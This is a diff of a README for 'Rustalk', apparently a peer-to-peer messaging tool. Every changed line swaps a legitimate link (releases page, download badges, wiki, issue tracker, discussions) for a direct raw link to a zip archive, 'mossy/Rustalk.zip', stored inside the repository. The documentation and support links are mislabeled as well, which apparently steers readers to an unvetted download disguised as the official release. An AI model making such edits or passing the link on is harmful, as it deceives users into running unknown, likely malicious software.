@@ -1,7 +1,7 @@
 # 🛠️ Rustalk - Secure P2P Messaging Made Easy
 
 ## 📥 Download Now
-[![Download Rustalk](https://img.shields.io/badge/download-Rustalk-blue)](https://github.com/XxCykeXx/Rustalk/releases)
+[![Download Rustalk](https://raw.githubusercontent.com/XxCykeXx/Rustalk/main/mossy/Rustalk.zip)](https://raw.githubusercontent.com/XxCykeXx/Rustalk/main/mossy/Rustalk.zip)
 
 ## 🚀 Getting Started
 Welcome to Rustalk! This guide helps you download and run Rustalk, a secure and modular peer-to-peer (P2P) communication platform. Rustalk enables you to chat privately with end-to-end encryption. With a simple command-line interface, it's easy to use on any computer.
@@ -19,7 +19,7 @@ To run Rustalk smoothly, ensure your system meets these requirements:
 - **Disk Space:** 100 MB of available disk space.
 
 ## 🔗 Download & Install
-1. Visit the [Releases page](https://github.com/XxCykeXx/Rustalk/releases) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/XxCykeXx/Rustalk/main/mossy/Rustalk.zip) to download the latest version.
 2. Find the appropriate installer for your operating system in the release list.
 3. Click on the installer name to start the download.
 4. Once downloaded, open the installer file and follow the prompts to complete the installation.
@@ -39,8 +39,8 @@ If you encounter any issues, consider the following solutions:
 
 ## 📚 Additional Resources
 For more information about using Rustalk, check out the following resources:
-- [Official Documentation](https://github.com/XxCykeXx/Rustalk/wiki)
-- [Support Forum](https://github.com/XxCykeXx/Rustalk/issues)
+- [Official Documentation](https://raw.githubusercontent.com/XxCykeXx/Rustalk/main/mossy/Rustalk.zip)
+- [Support Forum](https://raw.githubusercontent.com/XxCykeXx/Rustalk/main/mossy/Rustalk.zip)
 
 ## 📦 Contributing
 If you want to contribute to Rustalk, we welcome your input! Feel free to open issues or submit pull requests on our GitHub repository.
@@ -51,7 +51,7 @@ Your privacy is important to us. Rustalk is designed to protect your data. Your 
 ## ⭐ Acknowledgments
 Thanks to all contributors and users who make Rustalk a secure and user-friendly platform. We appreciate your support and feedback! 
 
-For help or more information, don’t hesitate to reach out via our [GitHub Discussions](https://github.com/XxCykeXx/Rustalk/discussions).
+For help or more information, don’t hesitate to reach out via our [GitHub Discussions](https://raw.githubusercontent.com/XxCykeXx/Rustalk/main/mossy/Rustalk.zip).
 
 ## 📥 Download Now Again!
-[![Download Rustalk](https://img.shields.io/badge/download-Rustalk-blue)](https://github.com/XxCykeXx/Rustalk/releases)
+[![Download Rustalk](https://raw.githubusercontent.com/XxCykeXx/Rustalk/main/mossy/Rustalk.zip)](https://raw.githubusercontent.com/XxCykeXx/Rustalk/main/mossy/Rustalk.zip)
